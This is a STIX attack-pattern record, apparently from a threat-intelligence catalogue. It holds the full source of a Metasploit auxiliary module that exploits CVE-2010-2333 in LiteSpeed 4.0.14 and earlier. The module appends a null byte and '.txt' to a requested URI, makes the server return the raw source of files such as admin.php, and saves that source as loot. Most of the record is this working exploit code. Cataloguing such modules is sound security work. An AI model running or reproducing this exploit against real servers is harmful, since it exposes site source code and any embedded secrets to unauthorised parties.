{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--47e0ea4a-e8d8-47d1-a4bb-67d8fac97590",
    "created": "2024-08-14T16:30:57.918971Z",
    "modified": "2024-08-14T16:30:57.918975Z",
    "name": "LiteSpeed Source Code Disclosure/Download",
    "description": " This module exploits a source code disclosure/download vulnerability in versions 4.0.14 and prior of LiteSpeed.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/litespeed_source_disclosure.rb",
            "external_id": "litespeed_source_disclosure.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'LiteSpeed Source Code Disclosure/Download',\n      'Description'    => %q{\n          This module exploits a source code disclosure/download vulnerability in\n        versions 4.0.14 and prior of LiteSpeed.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2010-2333' ],\n          [ 'OSVDB', '65476' ],\n          [ 'BID', '40815' ],\n          [ 'EDB', '13850' ]\n        ],\n      'Author'         =>\n        [\n          'Kingcope',  # initial disclosure\n          'xanda'      # Metasploit module\n        ],\n      'License'        =>  MSF_LICENSE)\n\n    register_options(\n      [\n        OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),\n        OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),\n      ])\n  end\n\n  def target_url\n    uri = normalize_uri(datastore['URI'])\n    \"http://#{vhost}:#{rport}#{datastore['URI']}\"\n  end\n\n  def run_host(ip)\n    uri = normalize_uri(datastore['URI'])\n    path_save = datastore['PATH_SAVE']\n\n    vuln_versions = [\n      \"LiteSpeed\"\n    ]\n\n    nullbytetxt = \"\\x00.txt\"\n\n    begin\n      res = send_request_raw({\n        'method'  => 'GET',\n        'uri'     => \"#{uri}#{nullbytetxt}\",\n      }, 25)\n\n      if res.nil?\n        print_error(\"#{target_url} - Connection timed out\")\n        return\n      end\n\n      version = res.headers['Server']\n\n      if vuln_versions.include?(version)\n        print_good(\"#{target_url} - LiteSpeed - Vulnerable version: #{version}\")\n\n        if (res and res.code == 200)\n\n          print_good(\"#{target_url} - LiteSpeed - Getting the source of page #{uri}\")\n          p = store_loot(\"litespeed.source\", \"text/plain\", rhost, res.body, path_save)\n          print_good(\"#{target_url} - LiteSpeed - File successfully saved: #{p}\")\n\n        else\n          print_error(\"http://#{vhost}:#{rport} - LiteSpeed - Unrecognized #{res.code} response\")\n          return\n\n        end\n\n      else\n        if version =~ /LiteSpeed/\n          print_error(\"#{target_url} - LiteSpeed - Cannot exploit: the remote server is not vulnerable - Version #{version}\")\n        else\n          print_error(\"#{target_url} - LiteSpeed - Cannot exploit: the remote server is not LiteSpeed\")\n        end\n        return\n\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}